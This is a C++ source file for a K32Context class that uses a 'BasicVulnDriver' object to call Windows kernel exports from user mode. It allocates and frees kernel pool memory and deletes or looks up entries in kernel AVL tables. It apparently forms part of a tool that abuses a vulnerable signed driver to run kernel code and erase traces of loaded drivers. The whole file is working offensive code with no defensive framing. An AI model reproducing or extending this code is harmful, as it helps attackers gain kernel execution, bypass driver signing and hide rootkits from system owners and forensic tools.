#include "k32_context.hpp"

#include <windows.h>

#include <DbgHelp.h>
#include <psapi.h>

K32Context::K32Context(std::shared_ptr<BasicVulnDriver> driver, std::shared_ptr<K32Module> k32Module)
    : driver(std::move(driver))
    , k32Module(std::move(k32Module))
{
}

K32Context::~K32Context()
{
}

const BasicVulnDriver& K32Context::GetDriver() const
{
    return *driver;
}

uintptr_t K32Context::AllocatePool(POOL_TYPE poolType, std::size_t size)
{
    static const auto exAllocPool = k32Module->GetK32ExportProcAddress("ExAllocatePoolWithTag");
    if (!exAllocPool) {
        spdlog::error("Failed to get export address for 'ExAllocatePoolWithTag'");
        return 0;
    }

    uintptr_t allocAddress = 0;
    if (!InvokeK32Routine(&allocAddress, exAllocPool, poolType, size, 'lnrk')) {
        spdlog::error("Failed to invoke 'ExAllocatePoolWithTag'");
        return 0;
    }

    return allocAddress;
}

bool K32Context::FreePool(uintptr_t address)
{
    static const auto exFreePool = k32Module->GetK32ExportProcAddress("ExFreePool");
    if (!exFreePool) {
        spdlog::error("Failed to get export address for 'ExFreePool'");
        return false;
    }

    return InvokeK32Routine(exFreePool, address);
}

bool K32Context::RtlDeleteElementGenericTableAvl(PVOID table, PVOID entry)
{
    static const auto rtlDeleteElement = k32Module->GetK32ExportProcAddress("RtlDeleteElementGenericTableAvl");
    if (!rtlDeleteElement) {
        spdlog::error("Failed to get export address for 'RtlDeleteElementGenericTableAvl'");
        return false;
    }

    bool retval = false;
    if (!InvokeK32Routine(&retval, rtlDeleteElement, table, entry)) {
        spdlog::error("Failed to invoke 'RtlDeleteElementGenericTableAvl'");
        return false;
    }

    return retval;
}

PVOID K32Context::RtlLookupElementGenericTableAvl(PRTL_AVL_TABLE table, PVOID buffer)
{
    static const auto rtlLookupElement = k32Module->GetK32ExportProcAddress("RtlLookupElementGenericTableAvl");
    if (!rtlLookupElement) {
        spdlog::error("Failed to get export address for 'RtlLookupElementGenericTableAvl'");
        return nullptr;
    }

    PVOID retval = nullptr;
    if (!InvokeK32Routine(&retval, rtlLookupElement, table, buffer)) {
        spdlog::error("Failed to invoke 'RtlLookupElementGenericTableAvl'");
        return nullptr;
    }

    return retval;
}